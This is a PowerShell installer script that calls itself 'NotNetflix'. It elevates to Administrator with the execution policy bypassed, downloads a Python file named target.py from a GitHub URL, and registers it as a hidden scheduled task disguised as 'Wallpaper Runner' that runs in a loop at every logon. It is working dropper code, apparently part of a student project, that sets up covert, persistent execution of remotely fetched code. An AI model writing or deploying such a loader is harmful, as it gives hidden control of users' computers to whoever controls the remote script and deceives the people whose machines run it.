# Ensure running as Administrator
If (-NOT ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

Write-Output "[*] Installing NotNetflix..."

# Configuration
$installPath = "$env:ProgramData\NotNetflix"
$scriptUrl = "https://raw.githubusercontent.com/lisenapati/pbl202.24/main/target/target.py"
$pythonPath = (Get-Command python3 -ErrorAction SilentlyContinue)?.Source
if (-not $pythonPath) { $pythonPath = (Get-Command python -ErrorAction Stop).Source }

# Create installation directory
New-Item -Path $installPath -ItemType Directory -Force | Out-Null

# Download target.py
Invoke-WebRequest -Uri $scriptUrl -OutFile "$installPath\target.py"

# Register Scheduled Task
$action = New-ScheduledTaskAction -Execute $pythonPath -Argument "`"$installPath\target.py`" --loop"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable

Register-ScheduledTask -TaskName "Wallpaper Runner" -Action $action -Trigger $trigger -Settings $settings -Force

Write-Output "[+] NotNetflix has been installed as a background task."

